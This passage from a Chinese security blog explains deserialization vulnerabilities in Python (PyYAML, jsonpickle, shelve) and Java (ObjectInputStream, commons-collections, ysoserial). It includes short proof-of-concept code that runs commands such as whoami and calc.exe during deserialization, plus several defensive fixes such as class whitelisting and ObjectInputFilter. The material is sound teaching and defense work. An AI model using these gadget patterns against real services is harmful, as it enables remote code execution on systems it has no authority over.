<p><a target="_blank" rel="noopener" href="http://www.bendawang.site/2018/04/18/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%9A%84%E8%8A%B1%E5%BC%8F%E5%88%A9%E7%94%A8/">http://www.bendawang.site/2018/04/18/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%9A%84%E8%8A%B1%E5%BC%8F%E5%88%A9%E7%94%A8/</a></p>
<h4 id="pyYaml"><a href="#pyYaml" class="headerlink" title="pyYaml"></a>pyYaml</h4><p>yaml和xml、json等类似，都是标记类语言，有自己的语法格式。各个支持yaml格式的语言都会有自己的实现来进行yaml格式的解析（读取和保存），其中PyYAML就是python的一个yaml库。</p>
<p>除了 YAML 格式中常规的列表、字典和字符串整形等类型转化外（基本数据类型），各个语言的 YAML 解析器或多或少都会针对其语言实现一套特殊的<strong>对象转化规则</strong>（也就是序列化和反序列化，这是关键点，是这个漏洞存在的前提)。</p>
<p>使用了<code>yaml.load</code>而不是<code>yaml.safe_load</code>函数来解析yaml文件的程序，<code>yaml.load</code>和<code>pickle.load</code>具有一样的功能，可以调用所有python函数。</p>
<p>yaml标签和python对象的关系，部分关系，详细<a target="_blank" rel="noopener" href="https://pyyaml.org/wiki/PyYAMLDocumentation">https://pyyaml.org/wiki/PyYAMLDocumentation</a></p>
<pre><code>!!str	str或unicode
!!map	dict
!!python/str	str
!!python/dict	dict
!!python/name:module.name	module.name
!!python/module:package.module	package.module
!!python/object:module.cls	module.cls 
!!python/object/new:module.cls	module.cls 
!!python/object/apply:module.f	
</code></pre>
<p>为了支持pickle协议，提供了两种附加形式的<code>!!python/object</code>标签</p>
<pre><code>!!python/object/new:module.Class
args: [argument, ...]
kwds: &#123;key: value, ...&#125;
state: ...
listitems: [item, ...]
dictitems: [key: value, ...]

!!python/object/apply:module.function
args: [argument, ...]
kwds: &#123;key: value, ...&#125;
state: ...
listitems: [item, ...]
dictitems: [key: value, ...]
</code></pre>
<p>可以使用<code>!!python/object</code>序列化任意对象。</p>
<pre><code class="none">!!python/object:module.Class &#123; attribute: value, ... &#125;
</code></pre>
<p>构造一个序列化，dump的结果就是上面的标签形式。</p>
<pre><code>#coding:utf-8
import yaml,os
class test:
    def __init__(self):
        os.system(&#39;whoami&#39;)
payload = yaml.dump(test())
print(payload)
yaml.load(payload)

#misaki\user
#!!python/object:__main__.test &#123;&#125;

</code></pre>
<h5 id="防御-2"><a href="#防御-2" class="headerlink" title="防御"></a>防御</h5><p>避免此问题可以使用<code>safe_load</code>来替换<code>load</code>，该函数<code>yaml.safe_load</code>将此功能限制为简单的Python对象（例如整数或列表）。</p>
<h4 id="Jsonpickle"><a href="#Jsonpickle" class="headerlink" title="Jsonpickle"></a>Jsonpickle</h4><p>用于将任意对象序列化为JSON的Python库。<code>Jsonpickle</code>可以使用几乎所有Python对象并将该对象转换为JSON。另外，它可以将对象重新构造回Python。该对象必须可以通过模块进行全局访问，并且必须继承自对象（又称新类）。<a target="_blank" rel="noopener" href="https://jsonpickle.github.io/#module-jsonpickle">https://jsonpickle.github.io/#module-jsonpickle</a></p>
<p>序列化：</p>
<p><code>frozen = jsonpickle.encode(obj)</code></p>
<p>反序列化</p>
<p><code>thawed = jsonpickle.decode(frozen)</code></p>
<p>利用方式与pickle相似</p>
<pre><code>&gt;&gt;&gt; class Thing(object):
...     def __init__(self, name):
...         os.system(&#39;whoami&#39;)
...
&gt;&gt;&gt; obj = Thing(&#39;Awesome&#39;)
misaki\user
</code></pre>
<h4 id="Shelve"><a href="#Shelve" class="headerlink" title="Shelve"></a>Shelve</h4><p>shelve用处是让对象持久化，但它在序列化与反序列化的过程中使用了pickle模块，因此我们可以利用shelve会调用的pickle在反序列化过程中执行代码。</p>
<pre><code>import shelve
import os
class exp(object):
    def __reduce__(self):
        return (os.system(&#39;ls&#39;))
        
file = shelve.open(&quot;test&quot;)
file[&#39;exp&#39;] = exp()
</code></pre>
<p><a target="_blank" rel="noopener" href="https://misakikata.github.io/2020/04/python-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#PyYAML">https://misakikata.github.io/2020/04/python-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#PyYAML</a></p>
<h3 id="java"><a href="#java" class="headerlink" title="java"></a>java</h3><p>序列化是让Java对象脱离Java运行环境的一种手段，可以有效的实现多平台之间的通信、对象持久化存储。</p>
<p>Java 序列化是指把 Java 对象转换为字节序列的过程便于保存在内存、文件、数据库中，ObjectOutputStream类的 writeObject() 方法可以实现序列化。反序列化是指把字节序列恢复为 Java 对象的过程，ObjectInputStream 类的 readObject() 方法用于反序列化。</p>
<p>一个类的对象要想序列化成功，必须满足两个条件：</p>
<ol>
<li>该类必须实现 java.io.Serializable 接口。</li>
<li>该类的所有属性必须是可序列化的。如果有一个属性不是可序列化的，则该属性必须注明是短暂的。</li>
</ol>
<h4 id="漏洞发现-2"><a href="#漏洞发现-2" class="headerlink" title="漏洞发现"></a>漏洞发现</h4><h5 id="开发失误"><a href="#开发失误" class="headerlink" title="开发失误"></a>开发失误</h5><ol>
<li>重写ObjectInputStream对象的resolveClass方法中的检测可被绕过。</li>
<li>使用第三方的类进行黑名单控制。虽然Java的语言严谨性要比PHP强的多，但在大型应用中想要采用黑名单机制禁用掉所有危险的对象几乎是不可能的。</li>
</ol>
<h5 id="基础库中隐藏的反序列化漏洞"><a href="#基础库中隐藏的反序列化漏洞" class="headerlink" title="基础库中隐藏的反序列化漏洞"></a>基础库中隐藏的反序列化漏洞</h5><p>存在危险的基础库：</p>
<pre><code>commons-fileupload 1.3.1
commons-io 2.4
commons-collections 3.1
commons-logging 1.2
commons-beanutils 1.9.2
org.slf4j:slf4j-api 1.7.21
com.mchange:mchange-commons-java 0.2.11
org.apache.commons:commons-collections 4.0
com.mchange:c3p0 0.9.5.2
org.beanshell:bsh 2.0b5
org.codehaus.groovy:groovy 2.3.9
org.springframework:spring-aop 4.1.4.RELEASE
</code></pre>
<p>漏洞触发场景：</p>
<ul>
<li>1.HTTP请求中的参数</li>
<li>2.RMI，即Java远程方法调用，在RMI中传输的数据皆为序列化</li>
<li>3.JMX，一个为应用程序植入管理功能的框架</li>
<li>4.自定义协议,用来接收与发送原始的java对象</li>
</ul>
<p>通过检索源码中对反序列化函数的调用来静态寻找反序列化的输入点<br>可以搜索以下函数：</p>
<pre><code>ObjectInputStream.readObject
ObjectInputStream.readUnshared
XMLDecoder.readObject
Yaml.load
XStream.fromXML
ObjectMapper.readValue
JSON.parseObject
</code></pre>
<p>小数点前面是类名，后面是方法名</p>
<p>② 确定了反序列化输入点后，再考察应用的Class Path中是否包含Apache Commons Collections等危险库（ysoserial所支持的其他库亦可）。</p>
<p>③ 若不包含危险库，则查看一些涉及命令、代码执行的代码区域，防止程序员代码不严谨，导致bug。</p>
<p>攻击工具：<a target="_blank" rel="noopener" href="https://github.com/frohoff/ysoserial">https://github.com/frohoff/ysoserial</a></p>
<p>在黑盒测试中并不清楚对方的代码架构，但仍然可以通过分析十六进制数据块，锁定某些存在漏洞的通用基础库（比如Apache Commons Collection）的调用地点，并进行数据替换，从而实现利用。<br>在实战过程中，我们可以通过抓包来检测请求中可能存在的序列化数据。</p>
<p>序列化数据通常以<code>AC ED</code>开始，之后的两个字节是版本号，版本号一般是<code>00 05</code>但在某些情况下可能是更高的数字。</p>
<h6 id="RASP检测"><a href="#RASP检测" class="headerlink" title="RASP检测"></a>RASP检测</h6><p>Java程序中类<code>ObjectInputStream</code>的<code>readObject</code>方法被用来将数据流反序列化为对象，如果流中的对象是class，则它的ObjectStreamClass描述符会被读取，并返回相应的class对象，ObjectStreamClass包含了类的名称及serialVersionUID。</p>
<p>类的名称及serialVersionUID的ObjectStreamClass描述符在序列化对象流的前面位置，且在<code>readObject</code>反序列化时首先会调用resolveClass读取反序列化的类名，所以RASP检测反序列化漏洞时可通过重写ObjectInputStream对象的resolveClass方法获取反序列化的类即可实现对反序列化类的黑名单校验。</p>
<h4 id="漏洞利用-2"><a href="#漏洞利用-2" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>在Java反序列化中，会调用被反序列化的readObject方法，当readObject方法书写不当时就会引发漏洞。</p>
<p>PS：有时也会使用readUnshared()方法来读取对象，readUnshared()不允许后续的readObject和readUnshared调用引用这次调用反序列化得到的对象，而readObject读取的对象可以。</p>
<p>eg：</p>
<pre><code>//反序列化所需类在io包中
import java.io.*;
public class test&#123;
    public static void main(String args[]) throws Exception&#123;

        UnsafeClass Unsafe = new UnsafeClass();
        Unsafe.name = &quot;hacked by ph0rse&quot;;

        FileOutputStream fos = new FileOutputStream(&quot;object&quot;);
        ObjectOutputStream os = new ObjectOutputStream(fos);
        //writeObject()方法将Unsafe对象写入object文件
        os.writeObject(Unsafe);
        os.close();
        //从文件中反序列化obj对象
        FileInputStream fis = new FileInputStream(&quot;object&quot;);
        ObjectInputStream ois = new ObjectInputStream(fis);
        //恢复对象
        UnsafeClass objectFromDisk = (UnsafeClass)ois.readObject();
        System.out.println(objectFromDisk.name);
        ois.close();
    &#125;
&#125;

class UnsafeClass implements Serializable&#123;
    public String name;
    //重写readObject()方法
    private void readObject(java.io.ObjectInputStream in) throws IOException, ClassNotFoundException&#123;
        //执行默认的readObject()方法
        in.defaultReadObject();
        //执行命令
        Runtime.getRuntime().exec(&quot;calc.exe&quot;);
    &#125;
&#125;
</code></pre>
<h4 id="防御-3"><a href="#防御-3" class="headerlink" title="防御"></a>防御</h4><h5 id="1-类白名单校验"><a href="#1-类白名单校验" class="headerlink" title="1.类白名单校验"></a><strong>1.类白名单校验</strong></h5><p>在<code>ObjectInputStream</code>中resolveClass 里只是进行了class 是否能被load，自定义ObjectInputStream, 重载resolveClass的方法，对className 进行白名单校验</p>
<h5 id="2-禁止JVM执行外部命令Runtime-exec"><a href="#2-禁止JVM执行外部命令Runtime-exec" class="headerlink" title="2.禁止JVM执行外部命令Runtime.exec"></a><strong>2.禁止JVM执行外部命令Runtime.exec</strong></h5><p>通过扩展SecurityManager可以实现</p>
<h4 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h4><h5 id="1、通过Hook-resolveClass来校验反序列化的类"><a href="#1、通过Hook-resolveClass来校验反序列化的类" class="headerlink" title="1、通过Hook resolveClass来校验反序列化的类"></a>1、通过Hook resolveClass来校验反序列化的类</h5><p>在使用<code>readObject()</code>反序列化时首先会调用resolveClass方法读取反序列化的类名，所以这里通过重写<code>ObjectInputStream</code>对象的resolveClass方法即可实现对反序列化类的校验。</p>
<pre><code>public class AntObjectInputStream extends ObjectInputStream&#123;
    public AntObjectInputStream(InputStream inputStream)
            throws IOException &#123;
        super(inputStream);
    &#125;

    /**
     * 只允许反序列化SerialObject class
     */
    @Override
    protected Class&lt;?&gt; resolveClass(ObjectStreamClass desc) throws IOException,
            ClassNotFoundException &#123;
        if (!desc.getName().equals(SerialObject.class.getName())) &#123;
            throw new InvalidClassException(
                    &quot;Unauthorized deserialization attempt&quot;,
                    desc.getName());
        &#125;
        return super.resolveClass(desc);
    &#125;
&#125;
</code></pre>
<p>通过此方法，可灵活的设置允许反序列化类的白名单，也可设置不允许反序列化类的黑名单。但反序列化漏洞利用方法一直在不断的被发现，黑名单需要一直更新维护，且未公开的利用方法无法覆盖。</p>
<p>根据以上方法，有大牛实现了线程的<a target="_blank" rel="noopener" href="https://github.com/ikkisoft/SerialKiller">SerialKiller</a>包可供使用。</p>
<h5 id="2-使用ValidatingObjectInputStream来校验反序列化的类"><a href="#2-使用ValidatingObjectInputStream来校验反序列化的类" class="headerlink" title="2.使用ValidatingObjectInputStream来校验反序列化的类"></a>2.使用ValidatingObjectInputStream来校验反序列化的类</h5><p>使用Apache Commons IO Serialization包中的ValidatingObjectInputStream类的accept方法来实现反序列化类白&#x2F;黑名单控制，具体可参考ValidatingObjectInputStream介绍；示例代码如下:</p>
<pre><code>private static Object deserialize(byte[] buffer) throws IOException,
ClassNotFoundException , ConfigurationException &#123;
    Object obj;
    ByteArrayInputStream bais = new ByteArrayInputStream(buffer);
    // Use ValidatingObjectInputStream instead of InputStream
    ValidatingObjectInputStream ois = new   ValidatingObjectInputStream(bais); 

    //只允许反序列化SerialObject class
    ois.accept(SerialObject.class);
    obj = ois.readObject();
    return obj;
&#125;
</code></pre>
<h5 id="3-使用contrast-rO0防御反序列化攻击"><a href="#3-使用contrast-rO0防御反序列化攻击" class="headerlink" title="3.使用contrast-rO0防御反序列化攻击"></a>3.使用contrast-rO0防御反序列化攻击</h5><p>contrast-rO0是一个轻量级的agent程序，通过通过重写ObjectInputStream来防御反序列化漏洞攻击。使用其中的SafeObjectInputStream类来实现反序列化类白&#x2F;黑名单控制，示例代码如下:</p>
<pre><code>SafeObjectInputStream in = new SafeObjectInputStream(inputStream, true);
in.addToWhitelist(SerialObject.class);

in.readObject();
</code></pre>
<h5 id="4-使用ObjectInputFilter来校验反序列化的类"><a href="#4-使用ObjectInputFilter来校验反序列化的类" class="headerlink" title="4.使用ObjectInputFilter来校验反序列化的类"></a>4.使用ObjectInputFilter来校验反序列化的类</h5><p>Java 9包含了支持序列化数据过滤的新特性，开发人员也可以继承java.io.ObjectInputFilter类重写checkInput方法实现自定义的过滤器，，并使用ObjectInputStream对象的setObjectInputFilter设置过滤器来实现反序列化类白&#x2F;黑名单控制。示例代码如下:</p>
<pre><code>import java.util.List;
import java.util.Optional;
import java.util.function.Function;
import java.io.ObjectInputFilter;
class BikeFilter implements ObjectInputFilter &#123;
    private long maxStreamBytes = 78; // Maximum allowed bytes in the stream.
    private long maxDepth = 1; // Maximum depth of the graph allowed.
    private long maxReferences = 1; // Maximum number of references in a graph.
    @Override
    public Status checkInput(FilterInfo filterInfo) &#123;
        if (filterInfo.references() &lt; 0 || filterInfo.depth() &lt; 0 || filterInfo.streamBytes() &lt; 0 || filterInfo.references() &gt; maxReferences || filterInfo.depth() &gt; maxDepth|| filterInfo.streamBytes() &gt; maxStreamBytes) &#123;
            return Status.REJECTED;
        &#125;
        Class&lt;?&gt; clazz = filterInfo.serialClass();
        if (clazz != null) &#123;
            if (SerialObject.class == filterInfo.serialClass()) &#123;
                return Status.ALLOWED;
            &#125;
            else &#123;
                return Status.REJECTED;
            &#125;
        &#125;
        return Status.UNDECIDED;
    &#125; // end checkInput
&#125; // end class BikeFilter
</code></pre>
<h5 id="5、禁止JVM执行外部命令Runtime-exec"><a href="#5、禁止JVM执行外部命令Runtime-exec" class="headerlink" title="5、禁止JVM执行外部命令Runtime.exec"></a>5、禁止JVM执行外部命令<code>Runtime.exec</code></h5><p>通过扩展SecurityManager</p>
<pre><code>SecurityManager originalSecurityManager = System.getSecurityManager();
        if (originalSecurityManager == null) &#123;
            // 创建自己的SecurityManager
            SecurityManager sm = new SecurityManager() &#123;
                private void check(Permission perm) &#123;
                    // 禁止exec
                    if (perm instanceof java.io.FilePermission) &#123;
                        String actions = perm.getActions();
                        if (actions != null &amp;&amp; actions.contains(&quot;execute&quot;)) &#123;
                            throw new SecurityException(&quot;execute denied!&quot;);
                        &#125;
                    &#125;
                    // 禁止设置新的SecurityManager，保护自己
                    if (perm instanceof java.lang.RuntimePermission) &#123;
                        String name = perm.getName();
                        if (name != null &amp;&amp; name.contains(&quot;setSecurityManager&quot;)) &#123;
                            throw new SecurityException(&quot;System.setSecurityManager denied!&quot;);
                        &#125;
                    &#125;
                &#125;

                @Override
                public void checkPermission(Permission perm) &#123;
                    check(perm);
                &#125;

                @Override
                public void checkPermission(Permission perm, Object context) &#123;
                    check(perm);
                &#125;
            &#125;;

            System.setSecurityManager(sm);
        &#125;
</code></pre>
<h5 id="6、不建议使用的黑名单"><a href="#6、不建议使用的黑名单" class="headerlink" title="6、不建议使用的黑名单"></a>6、不建议使用的黑名单</h5><p>在反序列化时设置类的黑名单来防御反序列化漏洞利用及攻击，这个做法在源代码修复的时候并不是推荐的方法，因为你不能保证能覆盖所有可能的类，而且有新的利用payload出来时也需要随之更新黑名单，但有一种场景下可能黑名单是一个不错的选择。写代码的时候总会把一些经常用到的方法封装到公共类，这样其它工程中用到只需要导入jar包即可，此前已经见到很多提供反序列化操作的公共接口，使用第三方库反序列化接口就不好用白名单的方式来修复了。这个时候作为第三方库也不知道谁会调用接口，会反序列化什么类，所以这个时候可以使用黑名单的方式来禁止一些已知危险的类被反序列化，具体的黑名单类可参考contrast-rO0、ysoserial中paylaod包含的类。</p>
<p><a target="_blank" rel="noopener" href="https://wooyun.js.org/drops/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AE%8C%E6%95%B4%E8%BF%87%E7%A8%8B%E5%88%86%E6%9E%90%E4%B8%8E%E8%B0%83%E8%AF%95.html">https://wooyun.js.org/drops/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AE%8C%E6%95%B4%E8%BF%87%E7%A8%8B%E5%88%86%E6%9E%90%E4%B8%8E%E8%B0%83%E8%AF%95.html</a></p>

    </div>
    
</div>
                         
<footer id="footer">
    <div class="footer-wrap">
        <div>
            © 20xx - 2022 Hexo
            <span class="footer-icon">
                <i class="fa-solid fa-font-awesome fa-fw"></i>
            </span>
            @John Doe
        </div>
        <div></div>
        <div>Based on the <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo Engine</a> & <a
                target="_blank" rel="noopener" href="https://github.com/argvchs/hexo-theme-particlex">ParticleX Theme</a></div>
        
    </div>
</footer>
                    </div>
                </div>
            </transition>
            <div id="img_show">
                <img id="img_content" alt="img_show">
            </div>
        </div>
        <script src="https://cdn.staticfile.org/highlight.js/11.5.1/highlight.min.js"></script>
        <script src="/js/particlex.js"></script>
        <script src="/js/showimg.js"></script>
        

    </body>
</html>